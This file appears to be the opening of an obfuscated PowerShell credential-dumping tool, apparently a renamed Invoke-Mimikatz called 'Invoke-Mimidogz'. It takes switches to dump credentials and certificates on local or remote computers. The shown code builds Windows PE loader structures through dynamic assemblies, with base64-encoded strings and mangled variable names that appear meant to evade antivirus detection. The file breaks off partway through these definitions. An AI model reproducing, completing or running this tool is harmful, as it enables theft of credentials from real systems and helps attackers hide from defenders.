function Invoke-Mimidogz
{
[CmdletBinding(DefaultParameterSetName="DumpCred")]
Param(
	[Parameter(Position = 0)]
	[String[]]
	$ComputerName,
    [Parameter(ParameterSetName = "DumpCred", Position = 1)]
    [Switch]
    $DumpCred,
    [Parameter(ParameterSetName = "DumpCerts", Position = 1)]
    [Switch]
    $DumpCerts,
    [Parameter(ParameterSetName = "CustomCommand", Position = 1)]
    [String]
    $Command
)
Set-StrictMode -Version 2
${_/=\__/\/\/=\/==\} = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		${/\____/\___/\_/\/},
        [Parameter(Position = 1, Mandatory = $true)]
		[String]
		${_/\_/\_/\/====\/=},
		[Parameter(Position = 2, Mandatory = $false)]
		[String]
		$FuncReturnType,
		[Parameter(Position = 3, Mandatory = $false)]
		[Int32]
		${/=\/\/\__/\___/=\},
		[Parameter(Position = 4, Mandatory = $false)]
		[String]
		$ProcName,
        [Parameter(Position = 5, Mandatory = $false)]
        [String]
        ${_____/==\____/\/=\}
	)
	Function __/\_/====\/=\__/=
	{
		$Win32Types = New-Object System.Object
		${__/====\_/=\_/\_/} = [AppDomain]::CurrentDomain
		${__/\/\___/=\_/\_/} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkA'))))
		${___/=\_/===\__/\/} = ${__/====\_/=\_/\_/}.DefineDynamicAssembly(${__/\/\___/=\_/\_/}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		${__/\_/\/=\_/==\_/} = ${___/=\_/===\__/\/}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBNAG8AZAB1AGwAZQA='))), $false)
		${___/==\____/\/===} = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUA'))), [UInt16] 0) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQAzADgANgA='))), [UInt16] 0x014c) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQB0AGEAbgBpAHUAbQA='))), [UInt16] 0x0200) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eAA2ADQA'))), [UInt16] 0x8664) | Out-Null
		${/===\__/=\/===\/=} = ${__/\_/====\/=\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value ${/===\__/=\/===\/=}
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAFQAeQBwAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIAMwAyAF8ATQBBAEcASQBDAA=='))), [UInt16] 0x10b) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))), [UInt16] 0x20b) | Out-Null
		${_____/=\____/\/\/} = ${__/\_/====\/=\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value ${_____/=\____/\/\/}
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAUwB5AHMAdABlAG0AVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBVAE4ASwBOAE8AVwBOAA=='))), [UInt16] 0) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBOAEEAVABJAFYARQA='))), [UInt16] 1) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8ARwBVAEkA'))), [UInt16] 2) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBVAEkA'))), [UInt16] 3) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBQAE8AUwBJAFgAXwBDAFUASQA='))), [UInt16] 7) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBFAF8ARwBVAEkA'))), [UInt16] 9) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEEAUABQAEwASQBDAEEAVABJAE8ATgA='))), [UInt16] 10) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEIATwBPAFQAXwBTAEUAUgBWAEkAQwBFAF8ARABSAEkAVgBFAFIA'))), [UInt16] 11) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIAVQBOAFQASQBNAEUAXwBEAFIASQBWAEUAUgA='))), [UInt16] 12) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIATwBNAA=='))), [UInt16] 13) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBYAEIATwBYAA=='))), [UInt16] 14) | Out-Null
		${__/==\_/\_/=\__/=} = ${__/\_/====\/=\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value ${__/==\_/\_/=\__/=}
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMAVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAwAA=='))), [UInt16] 0x0001) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAxAA=='))), [UInt16] 0x0002) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAyAA=='))), [UInt16] 0x0004) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAzAA=='))), [UInt16] 0x0008) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEQAWQBOAEEATQBJAEMAXwBCAEEAUwBFAA=='))), [UInt16] 0x0040) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEYATwBSAEMARQBfAEkATgBUAEUARwBSAEkAVABZAA=='))), [UInt16] 0x0080) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAE4AWABfAEMATwBNAFAAQQBUAA=='))), [UInt16] 0x0100) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBJAFMATwBMAEEAVABJAE8ATgA='))), [UInt16] 0x0200) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBTAEUASAA='))), [UInt16] 0x0400) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBCAEkATgBEAA=='))), [UInt16] 0x0800) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwA0AA=='))), [UInt16] 0x1000) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBXAEQATQBfAEQAUgBJAFYARQBSAA=='))), [UInt16] 0x2000) | Out-Null
		${__/\_/====\/=\/\_}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBUAEUAUgBNAEkATgBBAEwAXwBTAEUAUgBWAEUAUgBfAEEAVwBBAFIARQA='))), [UInt16] 0x8000) | Out-Null
		${___/\___/====\_/\} = ${__/\_/====\/=\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value ${___/\___/====\_/\}
		${_/=\_/\___/=\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABBAFQAQQBfAEQASQBSAEUAQwBUAE8AUgBZAA=='))), ${_/=\_/\___/=\_/=\}, [System.ValueType], 8)
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		${___/\/\/=\_/\_/=\} = ${__/\_/====\/=\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value ${___/\/\/=\_/\_/=\}
		${_/=\_/\___/=\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARgBJAEwARQBfAEgARQBBAEQARQBSAA=='))), ${_/=\_/\___/=\_/=\}, [System.ValueType], 20)
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAZQBjAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AG0AYgBvAGwAVABhAGIAbABlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAeQBtAGIAbwBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYATwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${___/==\__/=\/=\/\} = ${__/\_/====\/=\/\_}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value ${___/==\__/=\/=\/\}
		${_/=\_/\___/=\_/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${__/\_/====\/=\/\_} = ${__/\_/\/=\_/==\_/}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIANgA0AA=='))), ${_/=\_/\___/=\_/=\}, [System.ValueType], 240)
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${_____/=\____/\/\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${__/==\_/\_/=\__/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${___/\___/====\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(108) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${__/\_/====\/=\/\_}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${___/\/\/=\_/\_/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
